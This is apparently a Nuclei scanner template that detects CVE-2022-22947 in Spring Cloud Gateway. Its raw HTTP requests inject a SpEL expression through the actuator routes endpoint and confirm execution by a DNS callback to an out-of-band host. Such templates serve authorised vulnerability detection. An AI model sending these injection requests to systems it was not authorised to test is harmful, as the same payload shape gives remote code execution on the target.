id: CVE-2022-22947
info:
  name: Spring Cloud Gateway Code Injection
  author: pdteam
  severity: critical
  description: The vulnerability CVE-2022-22947 in Spring Cloud Gateway allows a remote
    attacker to execute arbitrary code on the host through a code injection attack
    on applications using Spring Cloud Gateway versions prior to 3.1.1+ and 3.0.7+
    with an exposed and unsecured Gateway Actuator endpoint.
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2022-22947
  - https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/
  - https://github.com/wdahlenburg/spring-gateway-demo
  - https://spring.io/blog/2022/03/01/spring-cloud-gateway-cve-reports-published
  - https://tanzu.vmware.com/security/cve-2022-22947
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2022-22947
    cwe-id: CWE-94
  tags: cve,cve2022,apache,spring,vmware,actuator,oast,kev
  metadata:
    impact: The impact of CVE-2022-22947, a Spring Cloud Gateway code injection vulnerability,
      is the potential for a remote attacker to achieve arbitrary remote execution
      on the vulnerable host.
    recommendation: It is strongly recommended that applications using Spring Cloud
      Gateway update to version 3.1.1+ or 3.0.7+ as soon as possible to mitigate the
      risk of CVE-2022-22947 code injection vulnerability.
requests:
- raw:
  - "POST /actuator/gateway/routes/{{randstr}} HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/json\n\n{\n  \"predicates\": [\n    {\n      \"name\": \"Path\"\
    ,\n      \"args\": {\n        \"_genkey_0\": \"/{{randstr}}/**\"\n      }\n  \
    \  }\n  ],\n  \"filters\": [\n    {\n      \"name\": \"RewritePath\",\n      \"\
    args\": {\n        \"_genkey_0\": \"#{T(java.net.InetAddress).getByName(\\\"{{interactsh-url}}\\\
    \")}\",\n        \"_genkey_1\": \"/${path}\"\n      }\n    }\n  ],\n  \"uri\"\
    : \"{{RootURL}}\",\n  \"order\": 0\n}\n"
  - "POST /actuator/gateway/refresh HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    \n{\n  \"predicate\": \"Paths: [/{{randstr}}], match trailing slash: true\",\n\
    \  \"route_id\": \"{{randstr}}\",\n  \"filters\": [\n    \"[[RewritePath #{T(java.net.InetAddress).getByName(\\\
    \"{{interactsh-url}}\\\")} = /${path}], order = 1]\"\n  ],\n  \"uri\": \"{{RootURL}}\"\
    ,\n  \"order\": 0\n}\n"
  - 'DELETE /actuator/gateway/routes/{{randstr}} HTTP/1.1

    Host: {{Hostname}}

    '
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 201
  - type: word
    part: header
    words:
    - /routes/{{randstr}}
  - type: word
    part: interactsh_protocol
    words:
    - dns
